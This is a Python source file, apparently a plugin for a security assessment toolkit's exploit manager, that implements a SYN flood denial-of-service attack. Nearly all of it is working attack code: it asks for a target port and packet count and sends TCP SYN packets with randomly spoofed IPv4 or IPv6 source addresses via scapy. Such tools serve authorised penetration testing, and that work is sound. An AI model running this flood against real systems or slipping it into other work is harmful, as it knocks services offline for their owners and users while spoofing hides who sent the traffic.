#!/usr/bin/python3
# Emre Ovunc
# info@emreovunc.com
# Python3 SYN Flood Tool CMD v2.0.1

import logging
import pluggy
from typing import Optional, Any
from scapy.all import *
from random import randint
from sat_toolkit.core.exploit_spec import ExploitResult
from sat_toolkit.models.Target_Model import TargetManager
from sat_toolkit.tools.input_mgr import Input_Mgr

logger = logging.getLogger(__name__)
hookimpl = pluggy.HookimplMarker("exploit_mgr")

class SynFloodAttackPlugin:
    def __init__(self):
        pass

    @hookimpl
    def initialize(self, device_plugin: Optional[Any] = None):
        logger.info("Initializing SynFloodAttackPlugin")
        pass

    @hookimpl
    def execute(self, target: Optional[Any] = None) -> ExploitResult:
        target_manager = TargetManager.get_instance()
        current_target = target_manager.get_current_target()
        
        if current_target is None:
            return ExploitResult(False, "No target selected. Please load a target first.", {})

        # Get port number from user input
        port = Input_Mgr.Instance().int_input(
            "Enter the target port number for SYN flood attack:",
            min_val=1,
            max_val=65535
        )

        # Get packet count from user input
        count = Input_Mgr.Instance().int_input(
            "Enter the number of packets to send:",
            min_val=1,
            max_val=10000  # You can adjust this maximum value as needed
        )

        # Extract target information from the current target object
        target = {
            'ip': current_target.ip_address,
            'port': port,  # Using user-provided port
            'count': count,  # Using user-provided count
            'ipv6': False  # Default value or from properties
        }

        if not target['ip']:
            return ExploitResult(False, "Target IP address not found", {})

        try:
            total = self._syn_flood_v6(target['ip'], target['port'], target['count']) if target['ipv6'] else self._syn_flood(target['ip'], target['port'], target['count'])
            return ExploitResult(True, f"SYN flood attack successful. Sent {total} packets", {
                "packets_sent": total,
                "target_ip": target['ip'],
                "target_port": target['port'],
                "ipv6": target['ipv6']
            })
        except Exception as e:
            logger.error(f"Error during SYN flood attack: {str(e)}")
            return ExploitResult(False, f"SYN flood attack failed: {str(e)}", {})

    @hookimpl
    def cleanup(self):
        logger.info("Cleaning up SynFloodAttackPlugin")
        pass

    def _random_ip(self):
        return ".".join(map(str, (randint(0, 255) for _ in range(4))))

    def _rand_int(self):
        return randint(1000, 9000)

    def _syn_flood(self, dst_ip, dst_port, counter):
        total = 0
        logger.info("Sending IPv4 SYN packets...")

        for _ in range(counter):
            s_port = self._rand_int()
            s_eq = self._rand_int()
            w_indow = self._rand_int()

            ip_packet = IP(src=self._random_ip(), dst=dst_ip)
            tcp_packet = TCP(
                sport=s_port,
                dport=int(dst_port),
                flags="S",
                seq=s_eq,
                window=w_indow
            )

            send(ip_packet/tcp_packet, verbose=0)
            total += 1

        logger.info(f"Total packets sent: {total}")
        return total

    def _syn_flood_v6(self, dst_ip, dst_port, counter):
        total = 0
        logger.info("Sending IPv6 SYN packets...")

        for _ in range(counter):
            s_port = self._rand_int()
            s_eq = self._rand_int()
            w_indow = self._rand_int()

            ip_packet = IPv6(src=RandIP6(), dst=dst_ip)
            tcp_packet = TCP(
                sport=s_port,
                dport=int(dst_port),
                flags="S",
                seq=s_eq,
                window=w_indow
            )

            send(ip_packet/tcp_packet, verbose=0)
            total += 1

        logger.info(f"Total packets sent: {total}")
        return total

def register_plugin(pm):
    syn_flood_attack_plugin = SynFloodAttackPlugin()
    pm.register(syn_flood_attack_plugin)
